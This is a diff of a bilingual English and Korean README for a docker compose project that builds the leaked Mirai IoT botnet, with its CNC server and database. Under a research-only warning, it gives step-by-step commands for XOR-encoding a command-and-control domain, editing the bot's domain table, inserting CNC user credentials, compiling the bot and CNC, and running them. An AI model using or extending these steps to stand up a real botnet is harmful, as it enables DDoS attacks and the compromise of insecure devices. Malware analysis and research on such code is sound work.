@@ -1,20 +1,37 @@
 # Mirai-Docker
 
-https://github.com/jgamblin/Mirai-Source-Code
+This is a docker compose file that makes it easy to build the [Mirai Botnet](https://en.wikipedia.org/wiki/Mirai_(malware)) development environment, CNC server and database.
+
+Mirai Botnet is a malware that performs DDoS attacks by infecting insecure Internet of Things(IoT) devices.
+It was used in a DDoS attack in 2016, and the source code was leaked.
+It is now open to [Mirai-Source-Code](https://github.com/jgamblin/Mirai-Source-Code) for malicious code analysis and research purposes. 
+
+미라이 봇넷의 개발 환경과 CNC 서버 및 데이터베이스를 쉽게 구축할 수 있도록 만든 도커 컴포즈 파일입니다.
+
+미라이 봇넷은 보안이 취약한 사물 인터넷(IoT) 기기를 감염시켜 DDoS 공격을 수행하는 악성코드입니다.
+2016년 DDoS 공격에 사용되었으며, 소스코드가 유출되어 현재는 악성코드 분석 및 연구 목적으로 [Mirai-Source-Code](https://github.com/jgamblin/Mirai-Source-Code)에 공개되어 있습니다.
+
+**WARNING: FOR RESEARCH PURPOSES ONLY. 연구 목적으로만 사용하세요.**
+
 
 ## 01. Install docker and docker compose
 https://docs.docker.com/get-docker/
 
-## 02. Clone repository
+https://github.com/docker/compose
+
+
+## 02. Clone this repository
 ```
 $ git clone https://github.com/deunlee/Mirai-Docker
 $ cd Mirai-Docker
 ```
 
+
 ## 03. Build docker containers
 ```
 $ docker compose build
 ```
+
 
 ## 04. Encrypt your domain
 ```
@@ -27,6 +44,7 @@ $ docker compose run compile ./enc.sh string report.mirai.com
 XOR'ing 17 bytes of data...
 \x50\x47\x52\x4D\x50\x56\x0C\x4F\x4B\x50\x43\x4B\x0C\x41\x4D\x4F\x22
 ```
+
 
 ## 05. Configure bot
 Edit some domains in [./src/mirai/bot/table.c](./src/mirai/bot/table.c)
@@ -52,6 +70,7 @@ struct resolv_entries *resolv_lookup(char *domain)
     // ...
 }
 ```
+
 
 ## 06. Configure CNC
 Edit database config in [./src/mirai/cnc/main.go](./src/mirai/cnc/main.go)
@@ -81,10 +100,12 @@ CREATE TABLE `history` (
 INSERT INTO users VALUES (NULL, 'mirai-user', 'mirai-pass', 0, 0, 0, 0, -1, 1, 30, ''); --- here!
 ```
 
+
 ## 07. Compile bot and CNC
 ```
 $ docker compose run compile ./build.sh
 ```
+
 
 ## 08. Run CNC and database server
 ```
@@ -131,6 +152,7 @@ $ docker compose run compile sudo ./src/mirai/debug/cnc
 $ docker compose exec compile telnet 127.0.0.1
 ```
 -->
+
 
 ## 09. Run bot
 ```
